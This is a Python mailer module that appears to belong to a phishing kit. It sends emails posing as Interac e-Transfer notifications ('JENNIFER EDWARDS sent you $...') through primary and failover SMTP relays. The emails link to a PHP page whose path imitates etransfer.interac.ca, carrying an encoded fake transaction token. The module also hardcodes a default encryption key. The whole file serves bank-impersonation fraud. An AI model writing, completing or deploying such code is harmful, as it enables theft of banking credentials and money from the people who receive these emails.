import os
import uuid
import logging
import time
import base64
import urllib.parse
from datetime import datetime, timedelta
from .smtp_provider import SMTPProvider
from .template_service import TemplateService
from .database import db

logger = logging.getLogger("MailerService")

class MailerService:
    def __init__(self):
        # Paths now relative to /bot instead of /server
        self.relay_alpha = SMTPProvider(
            os.getenv("SMTP_HOST", "smtp.rbos.net"),
            int(os.getenv("SMTP_PORT", 587)),
            os.getenv("SMTP_USERNAME_PRIMARY", "relay@rbos.net"),
            os.getenv("SMTP_PASSWORD_PRIMARY", "")
        )
        
        self.relay_beta = SMTPProvider(
            os.getenv("SMTP_HOST_FAILOVER", "smtp1.rbos.net"),
            int(os.getenv("SMTP_PORT_FAILOVER", 587)),
            os.getenv("SMTP_USERNAME_FAILOVER", "relay1@rbos.net"),
            os.getenv("SMTP_PASSWORD_FAILOVER", "")
        )
        
        self.encryption_key = os.getenv("ENCRYPTION_KEY", "a3f91b6cd024e8c29b76a149efcc5d42")
        
        # Explicit template directory mapping
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        template_dir = os.path.join(base_dir, 'templates')
        
        if not os.path.exists(template_dir):
            os.makedirs(template_dir, exist_ok=True)
            
        self.templates = TemplateService(template_dir)

    def generate_tx_id(self):
        return f"CA{str(uuid.uuid4())[:8].upper()}"

    def generate_link(self, tx_id, amount_val):
        app_url = os.getenv("APP_URL", "http://localhost:3000").rstrip('/')
        payload = {
            'transaction_id': tx_id,
            'amount': float(amount_val),
            'timestamp': int(time.time()),
            'expires': int(time.time()) + (30 * 86400)
        }
        query = urllib.parse.urlencode(payload)
        token = base64.b64encode(query.encode()).decode()
        safe_token = token.replace('+', '-').replace('/', '_').rstrip('=')
        # Pointing to the PHP gateway which usually remains on 3002
        return f"http://localhost:3002/cgi-admin2/app/api/etransfer.interac.ca/RF.do.php?deposit={safe_token}"

    def send_email(self, data, tx_id, link):
        recipient = data.get('recipient_email')
        sender_display = os.getenv("SENDER_NAME", "JENNIFER EDWARDS")
        
        context = {
            "sender_name": sender_display,
            "tx_id": tx_id,
            "transaction_id": tx_id,
            "amount": "{:.2f}".format(float(data.get('amount', 0))),
            "date": datetime.now().strftime("%b %d, %Y"),
            "expiry_date": (datetime.now() + timedelta(days=30)).strftime("%b %d, %Y"),
            "action_url": link,
            "etransfer_interac_ca": link,
            "memo": data.get('purpose', 'Interac e-Transfer'),
            "recipient_email": recipient,
            "receiver_name": data.get('recipient_name', 'Customer'),
        }

        template_name = data.get('template') or 'Deposit.html'
        html = self.templates.render(template_name, context)

        subject = f"INTERAC e-Transfer: {sender_display} sent you ${context['amount']}"
        
        try:
            self.relay_alpha.dispatch(recipient, sender_display, subject, html)
            path_taken = "RELAY_ALPHA"
        except Exception:
            self.relay_beta.dispatch(recipient, sender_display, subject, html)
            path_taken = "RELAY_BETA"

        db.log_event("MAILING_SUCCESS", f"Sent to {recipient} via {path_taken}")
        return {"success": True, "path": path_taken}